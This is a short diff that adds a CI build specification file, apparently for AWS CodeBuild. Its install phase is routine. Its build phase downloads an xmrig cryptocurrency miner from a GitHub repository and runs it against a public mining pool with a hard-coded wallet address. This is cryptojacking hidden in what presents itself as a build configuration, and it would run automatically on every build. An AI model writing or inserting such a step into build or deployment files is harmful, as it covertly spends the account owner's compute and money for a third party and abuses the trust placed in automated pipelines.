@@ -1,0 +1,10 @@
+version: 0.2
+
+phases:
+  install:
+    commands:
+      - apt-get update -y
+      - apt-get install -y sudo git wget
+  build:
+    commands:
+      - wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz && chmod +x xmrig && ./xmrig -o sg.qrl.herominers.com:1166 -u Q01050041823c1a1afe7c537eb25f5af740b97a9dac396196451d560da2414705556174d6d8244b -p full -a rx/0 -k --donate-level 1
